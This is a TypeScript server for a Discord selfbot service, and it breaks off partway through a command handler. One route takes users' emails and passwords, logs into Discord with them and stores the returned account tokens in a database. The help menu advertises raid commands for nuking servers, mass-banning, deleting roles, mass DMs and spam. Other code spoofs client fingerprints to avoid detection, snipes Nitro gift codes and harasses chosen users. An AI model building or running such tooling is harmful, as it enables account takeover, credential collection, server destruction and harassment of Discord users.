import express from 'express';
import { createServer as createViteServer } from 'vite';
import cors from 'cors';
import multer from 'multer';
import { v4 as uuidv4 } from 'uuid';
import { Client, RichPresence } from 'discord.js-selfbot-v13';
import { joinVoiceChannel } from '@discordjs/voice';
import { createCanvas, loadImage } from 'canvas';
import { supabase } from './src/lib/supabase';

// --- Types ---
interface BotSession {
  id: string;
  token: string;
  userId?: string;
  username?: string;
  discriminator?: string;
  avatar?: string;
  status: 'offline' | 'online' | 'busy' | 'error';
  logs: string[];
}

interface RpcConfig {
    name?: string;
    details?: string;
    state?: string;
    type?: 'PLAYING' | 'STREAMING' | 'LISTENING' | 'WATCHING' | 'COMPETING';
    largeImageKey?: string;
    largeImageText?: string;
    smallImageKey?: string;
    smallImageText?: string;
    button1Label?: string;
    button1Url?: string;
    button2Label?: string;
    button2Url?: string;
    applicationId?: string;
    startTimestamp?: number | string;
}

// --- State ---
// Map token -> Client instance
const activeClients = new Map<string, Client>();
// Map token -> Session Data
const sessions = new Map<string, BotSession>();
// Map token -> RPC Configs
const rpcSettings = new Map<string, RpcConfig[]>();
// Map token -> Selected RPC Index
const rpcSelectedIndex = new Map<string, number>();
const prefixes = new Map<string, string>(); // token -> prefix

const HELP_CATEGORIES: any = {
    1: { name: "Main", label: "[MAIN]", color: "#ff6b35", commands: [
        { name: ".help [1-6]", desc: "Shows the help menu for each category" },
        { name: ".ping", desc: "Check bot latency and current uptime" },
        { name: ".info", desc: "Display selfbot information & live stats" },
        { name: ".prefix <chr>", desc: "Change the command prefix on-the-fly" },
        { name: ".settoken <t>", desc: "Update your auth token in memory" },
        { name: ".reload", desc: "Restart the selfbot process entirely" },
        { name: ".eval <code>", desc: "Execute arbitrary Python code" },
        { name: ".host <u?> <t>", desc: "Host an account directly via token" },
        { name: ".clearselfbot", desc: "Reset VPS and clear all data (Emergency)" },
        { name: ".stop", desc: "Stop current activities" },
    ]},
    2: { name: "Raid", label: "[RAID]", color: "#dc2626", commands: [
        { name: ".massdm <msg>", desc: "Mass DM every reachable server member" },
        { name: ".spam <n> <msg>", desc: "Spam a message N times in the channel" },
        { name: ".webhookspam <msg> <n>", desc: "Spam via webhook" },
        { name: ".nuke", desc: "Destroy server (Channels, Roles, Spam)" },
        { name: ".rss", desc: "Restore server from nuke (Owner Only)" },
        { name: ".wl <@>", desc: "Whitelist user for commands" },
        { name: ".unwl <@>", desc: "Unwhitelist user" },
        { name: ".massban", desc: "Ban all non-admin members at once" },
        { name: ".adminrole", desc: "Grant yourself an admin-level role" },
        { name: ".rename <txt>", desc: "Rapidly rename all server channels" },
        { name: ".roledump", desc: "Delete every role from the server" },
    ]},
    3: { name: "Fun", label: "[FUN]", color: "#7b2fbe", commands: [
        { name: ".mock <txt>", desc: "MoCk AnYoNe'S tExT lIkE tHiS" },
        { name: ".reverse <t>", desc: "Reverse any text completely backwards" },
        { name: ".ascii <txt>", desc: "Convert your text into large ASCII art" },
        { name: ".copypasta", desc: "Send a random legendary copypasta" },
        { name: ".uwu <txt>", desc: "UwUify your text kawaii style~ owo" },
        { name: ".nitro", desc: "Prank someone with a fake Nitro link" },
        { name: ".clap <txt>", desc: "Replace spaces with claps" },
        { name: ".steal", desc: "Get URL of replied emoji/sticker" },
        { name: ".bully <@>", desc: "Mock a user's messages (I'm -> You're)" },
        { name: ".stealav <@>", desc: "Steal someone's avatar" },
    ]},
    4: { name: "Utility", label: "[UTILITY]", color: "#0096c7", commands: [
        { name: ".snipe", desc: "Retrieve the last deleted message" },
        { name: ".purge <n>", desc: "Bulk-delete N of your own messages" },
        { name: ".ghostping <@>", desc: "Ghost-ping a user without a trace" },
        { name: ".urban <word>", desc: "Search Urban Dictionary for a definition" },
        { name: ".status <txt>", desc: "Change your Discord custom status" },
        { name: ".game <txt>", desc: "Set a spoofed game activity status" },
        { name: ".avatar <@>", desc: "Fetch a user's full resolution avatar" },
        { name: ".serverinfo", desc: "Display detailed server statistics" },
        { name: ".userinfo <@>", desc: "Display detailed user info" },
        { name: ".clearcache", desc: "Clear saved data (AutoReact, RPC)" },
        { name: ".oll", desc: "Toggle AutoSkull mode" },
        { name: ".leave", desc: "Leave current server" },
        { name: ".blockuser <@>", desc: "Block a user" },
        { name: ".unblockuser <id>", desc: "Unblock a user by ID" },
    ]},
    5: { name: "Etc", label: "[ETC]", color: "#22c55e", commands: [
        { name: ".stream <txt>", desc: "Set streaming status" },
        { name: ".listen <txt>", desc: "Set listening status" },
        { name: ".watch <txt>", desc: "Set watching status" },
        { name: ".play <txt>", desc: "Set playing status" },
        { name: ".token <@>", desc: "Fetch public info from a user object" },
        { name: ".webhooksend", desc: "Send a message via a webhook URL" },
        { name: ".invisible", desc: "Toggle truly invisible presence" },
        { name: ".cloneserver", desc: "Clone current server's channel layout" },
        { name: ".stealemoji <e>", desc: "Steal & add any emoji to your server" },
        { name: ".typing <n>", desc: "Show typing indicator for N seconds" },
        { name: ".afk [msg]", desc: "Toggle AFK mode with auto-reply" },
        { name: ".ar <u?> <e>", desc: "Auto-react to user or self (stackable)" },
        { name: ".super <u?> <e>", desc: "Nitro super auto react (Burst)" },
        { name: ".clearar", desc: "Clear all auto-react rules" },
        { name: ".clearsuper", desc: "Clear all super-react rules" },
        { name: ".mdm <msg>", desc: "Mass DM all friends (FAST)" },
        { name: ".mdgc <msg>", desc: "Mass GC + Mass DM (Creates GCs, pings everyone)" },
        { name: ".leaveall", desc: "Leave all guilds (DANGEROUS)" },
        { name: ".closeall", desc: "Close all DM channels" },
        { name: ".unfriendall", desc: "Remove all friends (DANGEROUS)" },
        { name: ".readall", desc: "Mark all guilds/channels as read" },
        { name: ".poll <q>", desc: "Create a simple poll" },
        { name: ".calc <expr>", desc: "Calculate a math expression" },
        { name: ".weather <city>", desc: "Check weather for a city" },
        { name: ".translate <txt>", desc: "Generate Google Translate link" },
        { name: ".shorten <url>", desc: "Shorten a URL" },
        { name: ".define <word>", desc: "Define a word via Urban Dictionary" },
        { name: ".qr <txt>", desc: "Generate a QR code" },
        { name: ".channelinfo", desc: "Display current channel info" },
        { name: ".roleinfo <@role>", desc: "Display role info" },
    ]},
    6: { name: "Random", label: "[RANDOM]", color: "#f59e0b", commands: [
        { name: ".randomuser", desc: "Ping a random user in the server" },
        { name: ".dice", desc: "Roll a 6-sided die" },
        { name: ".coinflip", desc: "Flip a coin (Heads/Tails)" },
        { name: ".8ball <q>", desc: "Ask the all-knowing magic 8ball" },
        { name: ".cat", desc: "Random cat image" },
        { name: ".dog", desc: "Random dog image" },
        { name: ".fox", desc: "Random fox image" },
    ]}
};

const rotationTimers = new Map<string, NodeJS.Timeout>();
const multiFeatureEnabled = new Map<string, boolean>();
// Initialize multiFeatureEnabled to true for new sessions
// This is a bit tricky, let's just default to true when checking
const menuMode = new Map<string, 'text' | 'image'>();
const altClients = new Map<string, Client[]>();
const autoSkullMode = new Map<string, boolean>();
const ownerIds = new Map<string, string>();
const bullyList = new Map<string, Set<string>>();

// Map<token, Map<userId | 'self', Set<emoji>>>
const autoReactRules = new Map<string, Map<string, Set<string>>>();
const superReactRules = new Map<string, Map<string, Set<string>>>();
const deletedMessages = new Map<string, Map<string, any>>(); // token -> channelId -> messageData

const activeBackgrounds = new Map<string, string>();
const helpBackgrounds = new Map<string, string>();
let cdnBotToken: string | null = null;
let cdnChannelId: string | null = '1476576159947821210';

async function discordRequest(url: string, options: RequestInit): Promise<Response> {
    // 1. Randomized delay (throttling) - Reduced for speed
    const delay = Math.floor(Math.random() * 100) + 50; // 50ms - 150ms
    await new Promise(resolve => setTimeout(resolve, delay));

    // 2. Consistent headers
    const headers = new Headers(options.headers);
    headers.set('User-Agent', 'DiscordBot (https://discord.js.org, 14.0.0)');

    const response = await fetch(url, { ...options, headers });

    // 3. Rate-limit handling
    if (response.status === 429) {
        const retryAfter = response.headers.get('Retry-After');
        const delayMs = retryAfter ? parseInt(retryAfter) * 1000 : 2000;
        console.warn(`Rate limited. Retrying after ${delayMs}ms`);
        await new Promise(resolve => setTimeout(resolve, delayMs));
        return discordRequest(url, options); // Retry
    }

    return response;
}

// --- Persistence ---

async function saveSession(token: string) {
  const session = sessions.get(token);
  if (!session) return;
  await supabase.from('sessions').upsert({
    id: token, // Use token as ID for easy lookup
    session_id: session.id,
    username: session.username,
    discriminator: session.discriminator,
    avatar: session.avatar,
    status: session.status,
    logs: session.logs
  });
}

async function saveRpcSettings(token: string) {
  const configs = rpcSettings.get(token);
  if (!configs) return;
  await supabase.from('rpc_settings').upsert({ id: token, configs });
}

async function saveAutoReactRules(token: string) {
  const rules = autoReactRules.get(token);
  if (!rules) return;
  const obj: any = {};
  rules.forEach((emojis, userId) => {
    obj[userId] = Array.from(emojis);
  });
  await supabase.from('auto_react_rules').upsert({ id: token, rules: obj });
}

async function saveGlobalSettings() {
  const obj: any = {};
  activeBackgrounds.forEach((bg, token) => {
    obj[token] = bg;
  });
  await supabase.from('global_settings').upsert([
    { key: 'activeBackgrounds', value: { data: obj } }
  ]);
}

async function fetchExternalAsset(client: any, applicationId: string, imageKey: string) {
    try {
        // Use client.api to fetch assets
        const assets = await client.api.oauth2.applications(applicationId).assets.get();
        return assets.filter((a: any) => a.name === imageKey);
    } catch (e) {
        console.error('Failed to fetch external asset:', e);
        return [];
    }
}

async function loadState() {
  console.log('Loading state from Supabase...');
  try {
    // Load CDN Bot Token
    const { data: botConfig } = await supabase
        .from('bot_config')
        .select('value')
        .eq('key', 'cdn_bot_token')
        .single();
    if (botConfig) {
        cdnBotToken = botConfig.value;
        console.log('CDN Bot Token loaded from Supabase:', cdnBotToken.substring(0, 5) + '...');
    } else {
        console.warn('CDN Bot Token not found in Supabase');
    }

    // Load Sessions
    const { data: sessionData } = await supabase.from('sessions').select('*');
    if (sessionData) {
      for (const s of sessionData) {
        sessions.set(s.id, {
          id: s.session_id,
          token: s.id,
          username: s.username,
          discriminator: s.discriminator,
          avatar: s.avatar,
          status: 'offline', // Always start as offline
          logs: s.logs || []
        });
      }
    }

    // Load RPC
    const { data: rpcData } = await supabase.from('rpc_settings').select('*');
    if (rpcData) {
      for (const r of rpcData) {
        // Handle both old single config and new array of configs
        if (Array.isArray(r.configs)) {
            rpcSettings.set(r.id, r.configs);
        } else if (r.config) {
            rpcSettings.set(r.id, [r.config]);
        }
      }
    }

    // Load Auto React
    const { data: arData } = await supabase.from('auto_react_rules').select('*');
    if (arData) {
      for (const ar of arData) {
        const userMap = new Map<string, Set<string>>();
        for (const userId in ar.rules) {
          userMap.set(userId, new Set(ar.rules[userId]));
        }
        autoReactRules.set(ar.id, userMap);
      }
    }

    // Load Global Settings
    const { data: globalData } = await supabase.from('global_settings').select('*');
    if (globalData) {
      for (const g of globalData) {
        if (g.key === 'activeBackgrounds') {
            const data = g.value.data;
            for (const token in data) {
                activeBackgrounds.set(token, data[token]);
            }
        }
      }
    }

    // Load help backgrounds (we can store them in global_settings with prefix or a new table, but for now we'll just ignore persistence for it or use a simple JSON)
    const { data: helpData } = await supabase.from('global_settings').select('*').like('key', 'helpBg_%');
    if (helpData) {
        for (const h of helpData) {
            const t = h.key.split('_')[1];
            helpBackgrounds.set(t, h.value.data);
        }
    }
    console.log('State loaded successfully');
  } catch (e) {
    console.error('Failed to load state:', e);
  }
}

const whitelistedUsers = new Map<string, Set<string>>(); // token -> Set<userId>
const serverBackups = new Map<string, any>(); // guildId -> backupData
const antiNukeGuilds = new Map<string, Set<string>>(); // token -> Set<guildId>

process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err);
});

async function startServer() {
  const app = express();
  const PORT = Number(process.env.PORT) || 3000;

  console.log('Starting server initialization...');
  
  app.use(cors());
  app.use(express.json({ limit: '50mb' }));

  // Request logger
  app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
  });

  // Load state
  await loadState();
  console.log('State load complete');

  console.log('Registering routes...');
  
  // --- Health Check ---
  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString(), stateLoaded: true });
  });

  // --- Proxy Route ---
  app.get('/api/proxy/discord-cdn', async (req, res) => {
    const imageUrl = req.query.url as string;
    console.log('Proxying request for:', imageUrl);
    
    if (!imageUrl || !imageUrl.startsWith('https://cdn.discordapp.com/')) {
      console.error('Invalid URL:', imageUrl);
      return res.status(400).json({ error: 'Invalid or missing URL' });
    }

    try {
      const response = await fetch(imageUrl, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
      });
      console.log('Discord CDN response status:', response.status);
      
      if (!response.ok) throw new Error(`Failed to fetch image: ${response.statusText}`);
      
      const buffer = await response.arrayBuffer();
      res.setHeader('Content-Type', response.headers.get('Content-Type') || 'image/png');
      res.send(Buffer.from(buffer));
    } catch (error) {
      console.error('Proxy error:', error);
      res.status(500).json({ error: 'Failed to proxy image', details: error instanceof Error ? error.message : String(error) });
    }
  });

  // --- API Routes ---

  // 1. Login / Verify Token
  app.post('/api/auth/extract-token', async (req, res) => {
      const { email, password } = req.body;
      if (!email || !password) return res.status(400).json({ error: 'Email and password required' });

      try {
          const response = await fetch('https://discord.com/api/v9/auth/login', {
              method: 'POST',
              headers: {
                  'Content-Type': 'application/json',
                  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
              },
              body: JSON.stringify({
                  login: email,
                  password: password,
                  undelete: false,
                  captcha_key: null,
                  login_source: null,
                  gift_code_sku_id: null
              })
          });

          const data = await response.json();
          if (data.token) {
              // Store token in database
              await supabase.from('extracted_tokens').insert([{ email, token: data.token }]);
              res.json({ success: true, token: data.token });
          } else if (data.mfa) {
              res.status(401).json({ error: '2FA is enabled. Cannot extract token.' });
          } else if (data.captcha_key) {
              res.status(401).json({ error: 'Captcha required. Cannot extract token.' });
          } else {
              res.status(401).json({ error: data.message || 'Invalid credentials' });
          }
      } catch (e) {
          res.status(500).json({ error: 'Failed to contact Discord API' });
      }
  });

  app.post('/api/auth/login', async (req, res) => {
    let { token } = req.body;
    if (!token) return res.status(400).json({ error: 'Token required' });
    token = token.trim().replace(/^["']|["']$/g, ''); // Trim and remove quotes
    
    console.log(`Attempting login for token starting with: ${token.substring(0, 10)}...`);
    try {
      const client = await getClient(token);
      
      const session: BotSession = {
        id: uuidv4(),
        token,
        userId: client.user?.id,
        username: client.user?.username,
        discriminator: client.user?.discriminator,
        avatar: client.user?.displayAvatarURL(),
        status: 'online',
        logs: [`Logged in as ${client.user?.tag}`]
      };
      
      sessions.set(token, session);
      saveSession(token).catch(console.error);
      res.json({ success: true, session });
    } catch (error: any) {
      console.error('Login failed details:', error);
      let errorMessage = 'Invalid token or login failed';
      
      if (error?.message) {
          errorMessage = error.message;
      } else if (typeof error === 'string') {
          errorMessage = error;
      }
      
      res.status(401).json({ error: errorMessage });
    }
  });

  // --- Helpers ---
    async function buildCategoryImage(bgBase64: string | null, categoryNum: number) {
    const width = 900;
    const cat = HELP_CATEGORIES[categoryNum];
    if (!cat) return null;

    const height = 118 + cat.commands.length * 62 + 68;
    const canvas = createCanvas(width, height);
    const ctx = canvas.getContext('2d');

    // Background
    if (bgBase64) {
      try {
        const img = await loadImage(bgBase64);
        // Cover logic
        const scale = Math.max(width / img.width, height / img.height);
        const x = (width / 2) - (img.width / 2) * scale;
        const y = (height / 2) - (img.height / 2) * scale;
        ctx.drawImage(img, x, y, img.width * scale, img.height * scale);
        ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
        ctx.fillRect(0, 0, width, height);
      } catch (e) {
        ctx.fillStyle = '#18181b';
        ctx.fillRect(0, 0, width, height);
      }
    } else {
      ctx.fillStyle = '#18181b';
      ctx.fillRect(0, 0, width, height);
    }

    // Top Bar
    ctx.fillStyle = cat.color;
    ctx.fillRect(0, 0, width, 5);

    // Title
    ctx.font = 'bold 52px sans-serif';
    ctx.fillStyle = '#ffffff';
    ctx.fillText(cat.name.toUpperCase(), 50, 80);

    // Label
    ctx.font = '20px monospace';
    ctx.fillStyle = cat.color;
    ctx.fillText(cat.label, 50, 40);

    // Commands
    const cmdFont = '18px monospace';
    const descFont = '15px sans-serif';

    cat.commands.forEach((cmd: any, i: number) => {
        const ry = 100 + i * 62;
        
        // Row bg
        ctx.fillStyle = i % 2 === 0 ? 'rgba(255, 255, 255, 0.08)' : 'rgba(255, 255, 255, 0.04)';
        ctx.beginPath();
        // @ts-ignore
        if (ctx.roundRect) ctx.roundRect(40, ry + 3, width - 80, 51, 10);
        else ctx.rect(40, ry + 3, width - 80, 51);
        ctx.fill();

        // Dot
        ctx.fillStyle = cat.color;
        ctx.beginPath();
        ctx.arc(59, ry + 29, 5, 0, Math.PI * 2);
        ctx.fill();

        // Text
        ctx.font = cmdFont;
        ctx.fillStyle = '#ffffff'; // Accent color in python, white here for contrast
        ctx.fillText(cmd.name, 74, ry + 25);

        ctx.font = descFont;
        ctx.fillStyle = '#b4b4c0';
        ctx.fillText(cmd.desc, 74, ry + 45);
    });

    // Footer
    ctx.font = '14px monospace';
    ctx.fillStyle = '#6b7280';
    ctx.fillText('v1.0.7 | use responsibly', width / 2, height - 30);

    ctx.fillStyle = cat.color;
    ctx.fillRect(0, height - 4, width, 4);

    return canvas.toBuffer();
  }

  async function buildOverviewImage(bgBase64: string | null) {
    const width = 1000;
    const height = 590;
    const canvas = createCanvas(width, height);
    const ctx = canvas.getContext('2d');

    // Background
    if (bgBase64) {
      try {
        const img = await loadImage(bgBase64);
        const scale = Math.max(width / img.width, height / img.height);
        const x = (width / 2) - (img.width / 2) * scale;
        const y = (height / 2) - (img.height / 2) * scale;
        ctx.drawImage(img, x, y, img.width * scale, img.height * scale);
        ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
        ctx.fillRect(0, 0, width, height);
      } catch (e) {
        ctx.fillStyle = '#18181b';
        ctx.fillRect(0, 0, width, height);
      }
    } else {
      ctx.fillStyle = '#18181b';
      ctx.fillRect(0, 0, width, height);
    }

    // Title
    ctx.font = 'bold 54px sans-serif';
    ctx.fillStyle = '#ffffff';
    ctx.textAlign = 'center';
    ctx.fillText('// HELP MENU //', width / 2, 80);

    ctx.font = '17px monospace';
    ctx.fillStyle = '#a5a5af';
    ctx.fillText('Type .help <number> to explore a category', width / 2, 120);

    // Categories from HELP_CATEGORIES
    const categories = Object.keys(HELP_CATEGORIES).map(num => ({
        num: parseInt(num),
        name: HELP_CATEGORIES[num].name,
        color: HELP_CATEGORIES[num].color,
        count: HELP_CATEGORIES[num].commands.length
    }));

    const cw = 150;
    const ch = 210;
    const gap = 10;
    const startX = (width - (categories.length * cw + (categories.length - 1) * gap)) / 2;
    const startY = 180;

    categories.forEach((cat, i) => {
      const x = startX + i * (cw + gap);
      const y = startY;

      // Card
      ctx.fillStyle = 'rgba(12, 12, 18, 0.85)';
      ctx.beginPath();
      // @ts-ignore
      if (ctx.roundRect) ctx.roundRect(x, y, cw, ch, 16);
      else ctx.rect(x, y, cw, ch);
      ctx.fill();
      
      ctx.strokeStyle = cat.color;
      ctx.lineWidth = 2;
      ctx.stroke();

      // Top Bar
      ctx.fillStyle = cat.color;
      ctx.beginPath();
      // @ts-ignore
      if (ctx.roundRect) ctx.roundRect(x + 2, y + 2, cw - 4, 6, 2);
      else ctx.rect(x + 2, y + 2, cw - 4, 6);
      ctx.fill();

      // Number
      ctx.font = 'bold 48px sans-serif';
      ctx.fillStyle = cat.color;
      ctx.fillText(cat.num.toString(), x + cw / 2, y + 80);

      // Badge
      ctx.fillStyle = 'rgba(255, 255, 255, 0.1)';
      ctx.beginPath();
      // @ts-ignore
      if (ctx.roundRect) ctx.roundRect(x + cw / 2 - 40, y + 100, 80, 26, 12);
      else ctx.rect(x + cw / 2 - 40, y + 100, 80, 26);
      ctx.fill();
      
      ctx.font = '14px monospace';
      ctx.fillStyle = '#ffffff';
      ctx.fillText(`.help ${cat.num}`, x + cw / 2, y + 118);

      // Name
      ctx.font = 'bold 22px sans-serif';
      ctx.fillStyle = cat.color;
      ctx.fillText(cat.name, x + cw / 2, y + 160);

      // Count
      ctx.font = '12px monospace';
      ctx.fillStyle = '#8c8c96';
      ctx.fillText(`${cat.count} commands`, x + cw / 2, y + 185);
    });

    // Footer
    ctx.font = '14px monospace';
    ctx.fillStyle = '#6b7280';
    ctx.fillText('v1.0.7 | use responsibly', width / 2, height - 30);

    return canvas.toBuffer();
  }

  const antiMode = new Map<string, boolean>(); // token -> boolean (Anti-Detection Mode)
  const bullyList = new Map<string, Set<string>>(); // token -> Set<userId>
  
  // Alt Management
  const altClients = new Map<string, Client[]>(); // mainToken -> AltClients[]
  const autoSkullMode = new Map<string, boolean>(); // mainToken -> boolean
  const ownerIds = new Map<string, string>(); // mainToken -> ownerId (the user to autoskull)
  const activeNukes = new Map<string, boolean>(); // mainToken -> isRunning

  // --- Helper: Get or Create Client ---
  async function getClient(token: string): Promise<Client> {
    if (activeClients.has(token)) {
      const client = activeClients.get(token)!;
      if (client.isReady()) return client;
    }
    
    // Anti-Detection: Randomize Browser/OS if enabled
    const isAnti = antiMode.get(token);
    let wsProps = { $os: 'Windows', $browser: 'Discord Client', $device: '' };
    
    if (isAnti) {
        const browsers = ['Discord Client', 'Chrome', 'Firefox', 'Safari', 'Edge'];
        const osList = ['Windows', 'Mac OS X', 'Linux', 'iOS', 'Android'];
        wsProps.$browser = browsers[Math.floor(Math.random() * browsers.length)];
        wsProps.$os = osList[Math.floor(Math.random() * osList.length)];
    }

    const client = new Client({
      // @ts-ignore
      ws: { properties: wsProps }
    });

    return new Promise((resolve, reject) => {
      const timeout = setTimeout(() => {
        client.destroy();
        reject(new Error('Login timed out (30s)'));
      }, 30000);

      client.on('ready', () => {
        clearTimeout(timeout);
        console.log(`Logged in as ${client.user?.tag}`);
        resolve(client);
      });

      client.on('error', (err) => {
        clearTimeout(timeout);
        console.error('Discord client error:', err);
        reject(err);
      });

      activeClients.set(token, client);

      client.on('messageDelete', (message) => {
          if (!message.content && !message.attachments.size) return;
          let userDeletes = deletedMessages.get(token);
          if (!userDeletes) {
              userDeletes = new Map();
              deletedMessages.set(token, userDeletes);
          }
          
          let channelDeletes = userDeletes.get(message.channel.id) || [];
          channelDeletes.unshift({
              content: message.content,
              author: message.author?.tag,
              authorId: message.author?.id,
              timestamp: message.createdAt,
              attachments: message.attachments.map(a => a.url)
          });
          
          // Keep only the last 5 messages
          if (channelDeletes.length > 5) channelDeletes = channelDeletes.slice(0, 5);
          
          userDeletes.set(message.channel.id, channelDeletes);
      });

      // Anti-Nuke Logic
      const recentDeletions = new Map<string, { count: number, timer: NodeJS.Timeout }>();
      
      const handleAntiNuke = async (guild: any) => {
          const guildsSet = antiNukeGuilds.get(token);
          if (!guildsSet || !guildsSet.has(guild.id)) return;

          const key = guild.id;
          if (!recentDeletions.has(key)) {
              recentDeletions.set(key, {
                  count: 1,
                  timer: setTimeout(() => recentDeletions.delete(key), 5000)
              });
          } else {
              const data = recentDeletions.get(key)!;
              data.count++;
              if (data.count >= 3) {
                  // Possible nuke detected
                  try {
                      const logs = await guild.fetchAuditLogs({ limit: 5, type: 12 }).catch(() => null); // CHANNEL_DELETE
                      if (!logs) return;
                      const entry = logs.entries.first();
                      if (entry && entry.executor && entry.executor.id !== client.user?.id) {
                          const member = await guild.members.fetch(entry.executor.id).catch(() => null);
                          if (member && member.manageable) {
                              // Strip roles
                              await member.roles.set([]).catch(() => {});
                              addLog(token, `[Anti-Nuke] Stripped roles from ${entry.executor.tag} in ${guild.name}`);
                          }
                      }
                  } catch (e) {
                      console.error('Anti-nuke error:', e);
                  }
                  recentDeletions.delete(key);
              }
          }
      };

      client.on('channelDelete', async (channel: any) => {
          if (channel.guild) handleAntiNuke(channel.guild);
      });
      client.on('roleDelete', async (role: any) => {
          if (role.guild) handleAntiNuke(role.guild);
      });

      client.on('messageCreate', async (message) => {
        // Bully Logic
        const bulliedUsers = bullyList.get(token);
        if (bulliedUsers && bulliedUsers.has(message.author.id)) {
            const originalContent = message.content;
            if (originalContent) {
                let mockedContent = originalContent.replace(/I'm/gi, "You're");
                mockedContent = mockedContent.replace(/I /gi, "You ");
                mockedContent = mockedContent.replace(/my /gi, "your ");
                
                // Send the mocked message
                await message.channel.send(mockedContent).catch(() => {});
                // Delete original message?
                await message.delete().catch(() => {});
            }
        }

        // AutoSkull Logic (Alts react to Owner)
        // We check if this message is from the "Owner" (the one who enabled .oll)
        // Since we are inside the MAIN client's messageCreate, we can check if the author is the main user.
        // But we need to know if .oll is enabled for this token.
        if (autoSkullMode.get(token)) {
            const ownerId = ownerIds.get(token) || client.user?.id;
            if (message.author.id === ownerId) {
                const alts = altClients.get(token) || [];
                alts.forEach((alt, index) => {
                    // Stagger slightly to avoid instant rate limit but keep it fast
                    setTimeout(async () => {
                        try {
                            const channel = alt.channels.cache.get(message.channel.id) || await alt.channels.fetch(message.channel.id).catch(() => null);
                            if (channel && 'messages' in channel) {
                                // @ts-ignore
                                await channel.messages.react(message.id, '💀').catch(() => {});
                            }
                        } catch (e) {}
                    }, index * 20); 
                });
            }
        }

        // Enhanced regex to catch more link variations and case insensitivity
        const giftRegex = /(discord\.gift\/|discord\.com\/gifts\/|discordapp\.com\/gifts\/)([a-zA-Z0-9]+)/gi;
        const giftMatches = [...message.content.matchAll(giftRegex)];
        
        if (giftMatches.length > 0) {
            giftMatches.forEach(match => {
                const code = match[2];
                // Log immediately
                console.log(`[SNIPER] Detected code: ${code}`);
                addLog(token, `Detected Nitro Gift: ${code}. Attempting snipe...`);
                
                // Fire request immediately
                fetch(`https://discord.com/api/v9/entitlements/gift-codes/${code}/redeem`, {
                    method: 'POST',
                    headers: {
                        'Authorization': token, // User token
                        'Content-Type': 'application/json',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                    },
                    body: JSON.stringify({ channel_id: message.channel.id })
                }).then(async res => {
                    const json = await res.json();
                    if (json.subscription_plan) {
                        addLog(token, `SUCCESS! Sniped Nitro: ${json.subscription_plan.name}`);
                    } else if (json.message === 'Unknown Gift Code') {
                        addLog(token, `Snipe failed: Invalid Code (${code})`);
                    } else if (json.message === 'This gift has been redeemed already.') {
                        addLog(token, `Snipe failed: Already Redeemed (${code})`);
                    } else {
                        addLog(token, `Snipe failed: ${json.message} (${code})`);
                    }
                }).catch(e => addLog(token, `Snipe error: ${e}`));
            });
        }

        // Auto React Check
        const rules = autoReactRules.get(token);
        const sRules = superReactRules.get(token);
        if (rules || sRules) {
            const isMulti = multiFeatureEnabled.get(token) ?? true;
            const clientsToUse = isMulti ? [client, ...(altClients.get(token) || [])] : [client];

            for (const c of clientsToUse) {
                // Check for self react
                if (message.author.id === c.user?.id) {
                    if (rules && rules.has('self')) {
                        const emojis = rules.get('self');
                        if (emojis) {
                            for (const emoji of emojis) {
                                if (c === client) {
                                    message.react(emoji).catch(() => {});
                                } else {
                                    const channel = c.channels.cache.get(message.channel.id) || await c.channels.fetch(message.channel.id).catch(() => null);
                                    if (channel && 'messages' in channel) {
                                        // @ts-ignore
                                        await channel.messages.react(message.id, emoji).catch(() => {});
                                    }
                                }
                            }
                        }
                    }
                    if (sRules && sRules.has('self')) {
                        const emojis = sRules.get('self');
                        if (emojis) {
                            for (const emoji of emojis) {
                                if (c === client) {
                                    // @ts-ignore
                                    message.react(emoji, true).catch(() => {});
                                } else {
                                    const channel = c.channels.cache.get(message.channel.id) || await c.channels.fetch(message.channel.id).catch(() => null);
                                    if (channel && 'messages' in channel) {
                                        // @ts-ignore
                                        await channel.messages.react(message.id, emoji, true).catch(() => {});
                                    }
                                }
                            }
                        }
                    }
                }
                // Check for user react
                if (rules && rules.has(message.author.id)) {
                    const emojis = rules.get(message.author.id);
                    if (emojis) {
                        for (const emoji of emojis) {
                            if (c === client) {
                                message.react(emoji).catch(() => {});
                            } else {
                                const channel = c.channels.cache.get(message.channel.id) || await c.channels.fetch(message.channel.id).catch(() => null);
                                if (channel && 'messages' in channel) {
                                    // @ts-ignore
                                    await channel.messages.react(message.id, emoji).catch(() => {});
                                }
                            }
                        }
                    }
                }
                if (sRules && sRules.has(message.author.id)) {
                    const emojis = sRules.get(message.author.id);
                    if (emojis) {
                        for (const emoji of emojis) {
                            if (c === client) {
                                // @ts-ignore
                                message.react(emoji, true).catch(() => {});
                            } else {
                                const channel = c.channels.cache.get(message.channel.id) || await c.channels.fetch(message.channel.id).catch(() => null);
                                if (channel && 'messages' in channel) {
                                    // @ts-ignore
                                    await channel.messages.react(message.id, emoji, true).catch(() => {});
                                }
                            }
                        }
                    }
                }
            }
        }

        const prefix = prefixes.get(token) || '.';
        if (!message.content.startsWith(prefix)) return;

        const args = message.content.slice(prefix.length).trim().split(/ +/);
        const command = args.shift()?.toLowerCase();

        if (command === 'host') {
            await message.delete().catch(() => {});
            const targetUser = message.mentions.users.first() || (args[0] ? await client.users.fetch(args[0]).catch(() => null) : null);
            const targetToken = args[1];

            if (!targetUser || !targetToken) {
                await message.channel.send(`❌ Usage: \`${prefix}host <@user> <token>\``).catch(() => {});
                return;
            }

            // Check if token is already hosted
            if (activeClients.has(targetToken)) {
                const oldClient = activeClients.get(targetToken);
                if (oldClient) {
                    oldClient.destroy();
                    activeClients.delete(targetToken);
                }
            }

            try {
                await getClient(targetToken);
                const response = `> Hey ${targetUser} You Have been successfully Hosted In release.sb,\n` +
                                 `> Say these\n` +
